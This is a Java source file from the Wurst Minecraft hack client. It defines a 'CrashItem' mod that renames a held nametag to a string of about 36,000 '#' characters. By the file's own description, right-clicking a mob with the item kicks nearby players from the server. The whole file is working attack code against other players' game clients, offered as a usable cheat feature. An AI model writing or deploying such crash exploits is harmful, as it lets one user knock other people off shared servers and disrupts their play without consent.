/*
 * Copyright � 2014 - 2016 | Wurst-Imperium | All rights reserved.
 * 
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */
package tk.wurst_client.features.mods;

import net.minecraft.client.gui.inventory.GuiInventory;
import net.minecraft.item.ItemNameTag;
import tk.wurst_client.utils.ChatUtils;

@Mod.Info(
	description = "Generates a CrashItem.\n"
		+ "Right click a mob with it to kick nearby players from the server.",
	name = "CrashItem",
	tags = "CrashNametag, CrashTag, crash item, crash nametag, crash tag",
	help = "Mods/CrashItem")
@Mod.Bypasses
public class CrashItemMod extends Mod
{
	@Override
	public void onEnable()
	{
		if(mc.player.inventory.getCurrentItem() == null || !(mc.player.inventory
			.getCurrentItem().getItem() instanceof ItemNameTag))
		{
			ChatUtils.error("You are not holding a nametag in your hand.");
			setEnabled(false);
			return;
		}else if(!mc.player.capabilities.isCreativeMode)
		{
			ChatUtils.error("Creative mode only.");
			setEnabled(false);
			return;
		}
		String stackName = "";
		for(int i = 0; i < 3000; i++)
		{
			StringBuilder builder = new StringBuilder().append(stackName);
			stackName = builder.append("############").toString();
		}
		mc.player.inventory.getCurrentItem().setStackDisplayName(stackName);
		mc.displayGuiScreen(new GuiInventory(mc.player));
		mc.player.closeScreen();
		ChatUtils.message("CrashItem created. Right click a mob with it.");
		setEnabled(false);
	}
}
